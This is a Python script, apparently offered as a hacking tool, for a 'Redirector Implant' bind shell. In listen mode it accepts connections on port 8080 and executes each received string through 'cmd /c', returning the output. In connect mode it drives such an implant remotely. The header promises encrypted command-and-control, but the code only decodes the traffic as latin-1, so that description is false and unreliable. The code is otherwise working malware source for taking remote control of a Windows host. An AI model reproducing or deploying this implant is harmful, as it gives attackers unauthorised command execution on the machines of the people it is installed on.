## Redirector Implant - Encrypted C2 and BindShell
## By ShowNadda
## Version 1.0

# Global Imports
import socket, subprocess, threading, argparse, ctypes
from ctypes import DEFAULT_MODE

# Global Variables
port_default = 8080
buffer_limit = 4096

# Execute Command
def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"[!] Error: Command failed!"
    return output

# Decode Encrypted Data and strip
def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
    s.send(b"[!] Successfully Connected!!!")

    try:
        while True:
            s.send(b"\r\n[ReDi]: ")

            data = s.recv(buffer_limit)
            if data:
                buffer = decode_and_strip(data)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("[!] Now Executing Command: '{}'".format(buffer))
            s.send(execute_cmd(buffer))

    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            s.send(data.encode("latin-1"))
    except:
        s.close()
        exit()

def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(buffer_limit))
            if data:
                print("\n" + data, end="", flush=True)
    except:
        s.close()
        exit()

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port_default))
    s.listen()

    print("[!] Redirector Server has started!!!")
    while True:
        client_socket, addr = s.accept()
        print("[+] New Session has started!!!")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port_default))

    print("[!] Now Connecting to Redirector Implant!!!")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

# Creates the Commands and their needed Arguements
parser = argparse.ArgumentParser()
parser.add_argument("-l", "--listen", action="store_true", help="Create a Redirector Server", required=False)
parser.add_argument("-c", "--connect", help="Connect to a Redirector Server", required=False)
args = parser.parse_args()

if args.listen:
    server()
elif args.connect:
    client(args.connect)
